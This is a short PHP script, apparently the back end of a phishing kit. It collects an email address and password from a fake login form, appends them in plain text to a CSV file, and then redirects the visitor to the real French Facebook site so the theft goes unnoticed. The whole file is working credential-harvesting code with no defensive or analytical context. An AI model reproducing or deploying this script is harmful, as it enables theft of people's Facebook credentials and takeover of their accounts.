<?php

//recieve form post data and saving it in variables

$email = @$_POST['email'];
$password = @$_POST['pass'];


if (isset($_POST['email']) && empty($_POST['email'])) {
    echo 'Email address is required';
    return false;
};

if (isset($_POST['pass']) && empty($_POST['pass'])) {
    echo 'password is required';
    return false;
};


//name of file where data would be stored in

$filename = "../../data.csv";

//merging all variables into a sinle variable
$data = sprintf("%s;%s\n", $email, $password);


//save details to file
if (file_put_contents($filename, "$data", FILE_APPEND)) {
    header('Location: https://fr-fr.facebook.com/');
    exit();
} else {
    header('Location: failed.php');
    exit(403);
}